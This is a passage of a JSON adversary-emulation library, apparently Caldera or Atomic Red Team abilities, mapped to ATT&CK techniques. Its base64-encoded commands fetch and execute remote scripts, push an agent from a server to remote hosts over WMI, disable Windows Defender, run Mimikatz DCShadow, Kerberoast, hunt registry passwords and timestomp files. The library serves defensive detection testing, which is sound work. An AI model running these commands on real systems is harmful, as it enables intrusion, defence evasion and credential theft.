"U2V0LUxvY2F0aW9uIFBhdGhUb0F0b21pY3NGb2xkZXI7IC5cVDE1NzJcc3JjXFQxNTcyLWRvaC1kb21haW4tbGVuZ3RoLnBzMSAtRG9oU2VydmVyICN7ZG9oX3NlcnZlcn0gLURvbWFpbiAje2RvbWFpbn0gLVN1YmRvbWFpbiAje3N1YmRvbWFpbn0gLVF1ZXJ5VHlwZSAje3F1ZXJ5X3R5cGV9", "ability_id": "c6c559dbecc0305d0b0ac551d0b345cb", "technique_name": "Protocol Tunneling", "additional_info": {}, "privilege": "", "technique_id": "T1572", "platform": "windows", "name": "DNS over HTTPS Long Domain Query", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChpd3IgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMDQuMDAyL3NyYy9JbnZva2UtTWFsRG9jLnBzMSIgLVVzZUJhc2ljUGFyc2luZyk7IEludm9rZS1NYWxkb2MgLW1hY3JvRmlsZSAiUGF0aFRvQXRvbWljc0ZvbGRlclxUMTIwNC4wMDJcc3JjXGNocm9tZWV4ZWMtbWFjcm9jb2RlLnR4dCIgLW9mZmljZVByb2R1Y3QgIldvcmQiIC1zdWIgIkV4ZWNDaHJvbWUi", "ability_id": "98adc43648b0e4ea6e90a88ad5ae4b3d", "technique_name": "User Execution: Malicious File", "additional_info": {}, "privilege": "", "technique_id": "T1204.002", "platform": "windows", "name": "Headless Chrome code execution via VBA", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["U3RvcC1Qcm9jZXNzIC1uYW1lIG1zaHRh"], "executor": "psh", "access": {}, "description": "This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local\nwebserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver\nand pull down the script and execute it. By default the payload will execute calc.exe on the system.\n", "variations": []}, {"test": "MTIwMTFjX0FkRmluZC5leGUgLWdjYiAtc2MgdHJ1c3RkbXA=", "ability_id": "09da49dc99f7395aa172d0f261e365bd", "technique_name": "Domain Trust Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1482", "platform": "windows", "name": "Adfind - Enumerate Active Directory Trusts", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["12011c_AdFind.exe"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "variations": []}, {"test": "U2V0LUl0ZW1Qcm9wZXJ0eSAiSEtMTTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXIiIC1OYW1lIERpc2FibGVBbnRpU3B5d2FyZSAtVmFsdWUgMQ==", "ability_id": "43e3334362b140924f001b256b229ee5", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "Tamper with Windows Defender Registry", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["U2V0LUl0ZW1Qcm9wZXJ0eSAiSEtMTTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXIiIC1OYW1lIERpc2FibGVBbnRpU3B5d2FyZSAtVmFsdWUgMA=="], "executor": "psh", "access": {}, "description": "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n", "variations": []}, {"test": "T3V0LUFUSFBvd2VyU2hlbGxDb21tYW5kTGluZVBhcmFtZXRlciAtQ29tbWFuZExpbmVTd2l0Y2hUeXBlIEh5cGhlbiAtRW5jb2RlZENvbW1hbmRQYXJhbVZhcmlhdGlvbiBFIC1Vc2VFbmNvZGVkQXJndW1lbnRzIC1FbmNvZGVkQXJndW1lbnRzUGFyYW1WYXJpYXRpb24gRW5jb2RlZEFyZ3VtZW50cyAtRXhlY3V0ZSAtRXJyb3JBY3Rpb24gU3RvcA==", "ability_id": "b7d34f7b28d202f7216f3afdb889bf5d", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied", "variations": []}, {"test": "cmVnIHF1ZXJ5IEhLTE0gL2YgcGFzc3dvcmQgL3QgUkVHX1NaIC9z", "ability_id": "98e58fc4-3843-4511-89b1-50cb872e0c9b", "technique_name": "Unsecured Credentials: Credentials in Registry", "additional_info": {}, "privilege": "", "technique_id": "T1552.002", "platform": "windows", "name": "Credentials in Registry - HKLM", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Search for possible credentials stored in the HKLM Hive", "variations": []}, {"test": "d21pYyBwcm9jZXNzIGNhbGwgY3JlYXRlIG5vdGVwYWQuZXhl", "ability_id": "09e0f9cf2eb803a1c35deeecf3665fad", "technique_name": "Windows Management Instrumentation", "additional_info": {}, "privilege": "", "technique_id": "T1047", "platform": "windows", "name": "WMI Execute Local Process", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["d21pYyBwcm9jZXNzIHdoZXJlIG5hbWU9J25vdGVwYWQuZXhlJyBkZWxldGUgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "This test uses wmic.exe to execute a process on the local host.\nWhen the test completes , a new process will be started locally .A notepad application will be started when input is left on default.\n", "variations": []}, {"test": "R2V0LUNoaWxkSXRlbSAkZW52OlRFTVBcVDE1NTEuMDA2X3RpbWVzdG9tcC50eHQgfCAlIHsgJF8uQ3JlYXRpb25UaW1lID0gIjAxLzAxLzE5NzAgMDA6MDA6MDAiIH0=", "ability_id": "e3491b0c21b1ea606a3fccf3d9ed1ccc", "technique_name": "Indicator Removal on Host: Timestomp", "additional_info": {}, "privilege": "", "technique_id": "T1070.006", "platform": "windows", "name": "Windows - Modify file creation timestamp with PowerShell", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXFQxNTUxLjAwNl90aW1lc3RvbXAudHh0IC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.\n", "variations": []}, {"test": "T3V0LUFUSFBvd2VyU2hlbGxDb21tYW5kTGluZVBhcmFtZXRlciAtQ29tbWFuZExpbmVTd2l0Y2hUeXBlIEh5cGhlbiAtQ29tbWFuZFBhcmFtVmFyaWF0aW9uIEMgLUV4ZWN1dGUgLUVycm9yQWN0aW9uIFN0b3A=", "ability_id": "44bb962b6c2f39970fbbe84e3050c5d7", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "ATHPowerShellCommandLineParameter -Command parameter variations", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Executes powershell.exe with variations of the -Command parameter", "variations": []}, {"test": "TmV3LUl0ZW1Qcm9wZXJ0eSAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cSW50ZXJuZXQgU2V0dGluZ3MiIC1OYW1lIFQxMTEyIC1WYWx1ZSAiPHNjcmlwdD4i", "ability_id": "6722535bf5a14b87b5772b739f53321f", "technique_name": "Modify Registry", "additional_info": {}, "privilege": "", "technique_id": "T1112", "platform": "windows", "name": "Javascript in registry", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cSW50ZXJuZXQgU2V0dGluZ3MiIC1OYW1lIFQxMTEyIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "Upon execution, a javascript block will be placed in the registry for persistence.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.\n", "variations": []}, {"test": "bmV0IHVzZXIgL2RvbWFpbjsgZ2V0LWxvY2FsZ3JvdXBtZW1iZXIgLWdyb3VwIFVzZXJzOyBnZXQtYWR1c2VyIC1maWx0ZXIgKg==", "ability_id": "4712f45e41760276d20885bbc885a2ef", "technique_name": "Account Discovery: Domain Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.002", "platform": "windows", "name": "Enumerate all accounts via PowerShell (Domain)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n", "variations": []}, {"test": "IyBzdGFydGluZyBmYWtlIERDIHNlcnZlciwgYXMgU1lTVEVNIChyZXF1aXJlZCk7ICRkY19vdXRwdXRfZmlsZSA9ICIkZW52OlRFTVBcYXJ0LVQxMjA3LW1pbWlrYXR6LURDLmxvZyI7IFJlbW92ZS1JdGVtICRkY19vdXRwdXRfZmlsZSAtRXJyb3JBY3Rpb24gSWdub3JlOyAkbWltaWthdHpQYXJhbSA9ImAibG9nICRkY19vdXRwdXRfZmlsZWAiIGAibHNhZHVtcDo6ZGNzaGFkb3cgL29iamVjdDoje29iamVjdH0gL2F0dHJpYnV0ZToje2F0dHJpYnV0ZX0gL3ZhbHVlOiN7dmFsdWV9YCIgYCJleGl0YCIiOyAkZGMgPSBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCBjbWQuZXhlIC1WZXJiIFJ1bmFzIC1Bcmd1bWVudExpc3QgIi9jICN7cHNleGVjX3BhdGh9IC9hY2NlcHRldWxhIC1kIC1zICN7bWltaWthdHpfcGF0aH0gJG1pbWlrYXR6UGFyYW0iOyA7ICMgd2FpdCBmb3IgZmFrZSBEQyBzZXJ2ZXIgdG8gYmUgcmVhZHkuLi47IFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDU7IDsgIyBzZXJ2ZXIgcmVhZHksIHNvIHRyaWdnZXIgcmVwbGljYXRpb24gKHB1c2gpIGFuZCB3YWl0IHVudGlsIGl0IGZpbmlzaGVkOyAmICN7bWltaWthdHpfcGF0aH0gImxzYWR1bXA6OmRjc2hhZG93IC9wdXNoIiAiZXhpdCI7IDsgV3JpdGUtSG9zdCAiYG5XYWl0aW5nIGZvciBmYWtlIERDIHNlcnZlciB0byByZXR1cm4iOyBXYWl0LVByb2Nlc3MgJGRjOyA7IFdyaXRlLUhvc3QgImBuT3V0cHV0IGZyb20gZmFrZSBEQyBzZXJ2ZXI6IjsgR2V0LUNvbnRlbnQgJGRjX291dHB1dF9maWxlOyBTdGFydC1TbGVlcCAxICMgd2FpdCBhIGxpdHRsZSB1bnRpbCB0aGUgZmlsZSBpcyBub3QgbG9ja2VkIGFueW1vcmUgc28gd2UgY2FuIGFjdHVhbGx5IGRlbGV0ZSBpdDsgUmVtb3ZlLUl0ZW0gJGRjX291dHB1dF9maWxlIC1FcnJvckFjdGlvbiBJZ25vcmU7IDsgV3JpdGUtSG9zdCAiRW5kIG9mIERDU2hhZG93Ig==", "ability_id": "ef5db0bcd87583e711535d6ffb667823", "technique_name": "Rogue Domain Controller", "additional_info": {}, "privilege": "", "technique_id": "T1207", "platform": "windows", "name": "DCShadow (Active Directory)", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["U3RvcC1Qcm9jZXNzIC1OYW1lICJtaW1pa2F0eiIgLUZvcmNlIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n\nIt will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:\nGet-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount\n\nNeed SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.\nThe easiest is to run elevated and as a Domain Admin user.\n", "variations": []}, {"test": "bmJ0c3RhdCAtbg==", "ability_id": "14a21534-350f-4d83-9dd7-3c56b93a0c17", "technique_name": "System Network Configuration Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1016", "platform": "windows", "name": "Find Domain", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.nbtstat", "relationships": [{"edge": "", "source": "network.domain.name", "custom_parser_vals": {}, "target": ""}]}], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Find Domain information", "variations": []}, {"test": "UmVtb3ZlLUl0ZW0gLVBhdGggJGVudjpURU1QXGRlbGV0ZW1lX2ZvbGRlcl9UMTU1MS4wMDQgLVJlY3Vyc2U=", "ability_id": "f6e9ca79df57e0aeccf0b369de58d1fc", "technique_name": "Indicator Removal on Host: File Deletion", "additional_info": {}, "privilege": "", "technique_id": "T1070.004", "platform": "windows", "name": "Delete an entire folder - Windows PowerShell", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Recursively delete a folder in the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n", "variations": []}, {"test": "bmV0IHVzZXIgL2RvbWFpbg==", "ability_id": "c7ec57cd-933e-42b6-99a4-e852a9e57a33", "technique_name": "Account Discovery: Domain Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.002", "platform": "windows", "name": "Account Discovery (all)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "The net utility is executed via cmd to enumerate domain user accounts.", "variations": []}, {"test": "YXJwIC1h", "ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Collect ARP details", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.ipaddr", "relationships": [{"edge": "", "source": "remote.host.ip", "custom_parser_vals": {}, "target": ""}]}], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Locate all active IP and FQDNs on the network", "variations": []}, {"test": "JG93bmVycyA9IEB7fTtnd21pIHdpbjMyX3Byb2Nlc3MgfCUgeyRvd25lcnNbJF8uaGFuZGxlXSA9ICRfLmdldG93bmVyKCkudXNlcn07JHBzID0gZ2V0LXByb2Nlc3MgfCBzZWxlY3QgcHJvY2Vzc25hbWUsSWQsQHtsPSJPd25lciI7ZT17JG93bmVyc1skXy5pZC50b3N0cmluZygpXX19O2ZvcmVhY2goJHAgaW4gJHBzKSB7ICAgIGlmKCRwLk93bmVyIC1lcSAiI3tob3N0LnVzZXIubmFtZX0iKSB7ICAgICAgICAkcDsgICAgfX0=", "ability_id": "3b5db901-2cb8-4df7-8043-c4628a6a5d5a", "technique_name": "Process Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1057", "platform": "windows", "name": "Find user processes", "requirements": [{"relationship_match": [{"source": "host.user.name"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Get process info for processes running as a user", "variations": []}, {"test": "QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uSWRlbnRpdHlNb2RlbDsgJENvbXB1dGVyRlFETj0kZW52OkxvZ29uU2VydmVyLnRyaW1TdGFydCgnXCcpICsgIi4iICsgJGVudjpVc2VyRG5zRG9tYWluOyBOZXctT2JqZWN0IFN5c3RlbS5JZGVudGl0eU1vZGVsLlRva2Vucy5LZXJiZXJvc1JlcXVlc3RvclNlY3VyaXR5VG9rZW4gLUFyZ3VtZW50TGlzdCAiSFRUUC8kQ29tcHV0ZXJGUUROIg==", "ability_id": "91a18ae1efe4119a549cea2ac7de72c4", "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting", "additional_info": {}, "privilege": "", "technique_id": "T1558.003", "platform": "windows", "name": "Request A Single Ticket via PowerShell", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the endpoint in question.\n", "variations": []}, {"test": "cnVuZGxsMzIgdmJzY3JpcHQ6IlwuLlxtc2h0bWwsUnVuSFRNTEFwcGxpY2F0aW9uICIrU3RyaW5nKENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1bigiY2FsYy5leGUiKSwwKQ==", "ability_id": "e0c877693f820e4da83d2bbaeaf90ea6", "technique_name": "Signed Binary Proxy Execution: Rundll32", "additional_info": {}, "privilege": "", "technique_id": "T1218.011", "platform": "windows", "name": "Rundll32 execute VBscript command", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n", "variations": []}, {"test": "dGFza2xpc3QgL20gID4+ICRlbnY6QVBQREFUQVx2bXRvb2wubG9nO2NhdCAkZW52OkFQUERBVEFcdm10b29sLmxvZw==", "ability_id": "8adf02e8-6e71-4244-886c-98c402857404", "technique_name": "Process Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1057", "platform": "windows", "name": "tasklist Process Enumeration", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Capture running processes and their loaded DLLs", "variations": []}, {"test": "JFNlcnZlcj0iI3tsb2dvbnNlcnZlcn0iOyAkVXNlcj0iI3t1c2VybmFtZX0iOyAkUGFzc3dvcmQ9IiN7cGFzc3dvcmR9IjsgY21ka2V5IC9nZW5lcmljOlRFUk1TUlYvJFNlcnZlciAvdXNlcjokVXNlciAvcGFzczokUGFzc3dvcmQ7IG1zdHNjIC92OiRTZXJ2ZXI7IGVjaG8gIlJEUCBjb25uZWN0aW9uIGVzdGFibGlzaGVkIg==", "ability_id": "5f2a68667604f0e3f8188d2a083fbcc5", "technique_name": "Remote Services: Remote Desktop Protocol", "additional_info": {}, "privilege": "", "technique_id": "T1021.001", "platform": "windows", "name": "RDP to Server", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JHA9VGFza2xpc3QgL3N2YyAvZmkgIklNQUdFTkFNRSBlcSBtc3RzYy5leGUiIC9mbyBjc3YgfCBjb252ZXJ0ZnJvbS1jc3Y7IGlmKC1ub3QgKFtzdHJpbmddOjpJc051bGxPckVtcHR5KCRwLlBJRCkpKSB7IFN0b3AtUHJvY2VzcyAtSWQgJHAuUElEIH0="], "executor": "psh", "access": {}, "description": "Attempt an RDP session via Remote Desktop Application over Powershell\n", "variations": []}, {"test": "ZWNobyBHZXQtUHJvY2VzcyB8IGNsaXA7IEdldC1DbGlwYm9hcmQgfCBpZXg=", "ability_id": "8c0f619c7dfd33907bf20b1dfb58022b", "technique_name": "Clipboard Data", "additional_info": {}, "privilege": "", "technique_id": "T1115", "platform": "windows", "name": "Execute Commands from Clipboard using PowerShell", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Utilize PowerShell to echo a command to clipboard and execute it\n", "variations": []}, {"test": "cmVnIGFkZCAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcU3lzdGVtIiAvdiAiRGlzYWJsZUNNRCIgL3QgUkVHX0RXT1JEIC9kICIxIiAvZg==", "ability_id": "6dffe2334ab53b8f01935837f095444b", "technique_name": "Modify Registry", "additional_info": {}, "privilege": "", "technique_id": "T1112", "platform": "windows", "name": "Disable Windows CMD application", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGRlbGV0ZSAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcU3lzdGVtIiAvdiAiRGlzYWJsZUNNRCIgL2YgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows CMD application.\nSee example how Agent Tesla malware abuse this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n", "variations": []}, {"test": "JHNlcnZlcj0iI3tzZXJ2ZXJ9Ijskc2hhcmVQYXRoPSIje3NoYXJlfSI7U2V0LUxvY2F0aW9uICRzaGFyZVBhdGg7JHVybD0iJCgkc2VydmVyKS9maWxlL2Rvd25sb2FkIjskd2M9TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDskd2MuSGVhZGVycy5hZGQoInBsYXRmb3JtIiwid2luZG93cyIpOyR3Yy5IZWFkZXJzLmFkZCgiZmlsZSIsInNhbmRjYXQuZ28iKTsoJGRhdGE9JHdjLkRvd25sb2FkRGF0YSgkdXJsKSkgLWFuZCgkbmFtZT0kd2MuUmVzcG9uc2VIZWFkZXJzWyJDb250ZW50LURpc3Bvc2l0aW9uIl0uU3Vic3RyaW5nKCR3Yy5SZXNwb25zZUhlYWRlcnNbIkNvbnRlbnQtRGlzcG9zaXRpb24iXS5JbmRleE9mKCJmaWxlbmFtZT0iKSs5KS5SZXBsYWNlKCJgIiIsIiIpKS1hbmQgKFtpby5maWxlXTo6V3JpdGVBbGxCeXRlcygiJCgkc2hhcmVQYXRoKSRuYW1lLmV4ZSIsJGRhdGEpKTskc3RhcnRTZXJ2ZXI9IiQoJHNoYXJlUGF0aCkkbmFtZS5leGUgLXNlcnZlciAkKCRzZXJ2ZXIpICI7SW52b2tlLUNvbW1hbmQtU2NyaXB0QmxvY2sge1BhcmFtKFtzdHJpbmddJHN0YXJ0U2VydmVyLCAkc2hhcmVQYXRoLCAkbmFtZSwgJHNlcnZlcikgIEludm9rZS1XbWlNZXRob2QtQ2xhc3MgV2luMzJfUHJvY2VzcyAtTmFtZSBDcmVhdGUgLUFyZ3VtZW50TGlzdCAiJCgkc2hhcmVQYXRoKSRuYW1lLmV4ZS1zZXJ2ZXIgJHNlcnZlciAtdiIgfSAtQ29tcHV0ZXJOYW1lICN7cmVtb3RlLmhvc3QubmFtZX0gLUFyZ3VtZW50TGlzdCAkc3RhcnRTZXJ2ZXIsICRzaGFyZVBhdGgsICRuYW1lLCAkc2VydmVy", "ability_id": "3734aa1e-c536-42b3-8912-4c91b8bdce90", "technique_name": "Remote Services: Windows Remote Management", "additional_info": {}, "privilege": "", "technique_id": "T1021.006", "platform": "windows", "name": "Copy Sandcat File using Powershell", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["sandcat.go-windows"], "cleanup": ["ZGVsIHNhbmRjYXQuZ28td2luZG93czsgSW52b2tlLUNvbW1hbmQgLUNvbXB1dGVyTmFtZQ==", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJzYW5kY2F0LmdvLXdpbmRvd3Mi"], "executor": "psh", "access": {}, "description": "Copy Sandcat file using PowerShell", "variations": []}, {"test": "cmVnIGFkZCAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIiAvdiBEaXNhYmxlQ2hhbmdlUGFzc3dvcmQgL3QgUkVHX0RXT1JEIC9kIDEgL2Y=", "ability_id": "2de637b9a70fbaa9f289fc9c515bbe3b", "technique_name": "Modify Registry", "additional_info": {}, "privilege": "", "technique_id": "T1112", "platform": "windows", "name": "Disable Windows Change Password Feature", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGRlbGV0ZSAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIiAvdiBEaXNhYmxlQ2hhbmdlUGFzc3dvcmQgL2YgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows change password feature.\nSee how ransomware abuse this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom_heartbleed.thdobah\n", "variations": []}, {"test": "cmVnIGFkZCAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIiAvdiBEaXNhYmxlVGFza21nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==", "ability_id": "c0ab226c5c2e15caed0f7c2b02dfca3a", "technique_name": "Modify Registry", "additional_info": {}, "privilege": "", "technique_id": "T1112", "platform": "windows", "name": "Disable Windows Task Manager application", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGRlbGV0ZSAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIiAvdiBEaXNhYmxlVGFza21nciAvZiA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows task manager application.\nSee example how Agent Tesla malware abuse this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n", "variations": []}, {"test": 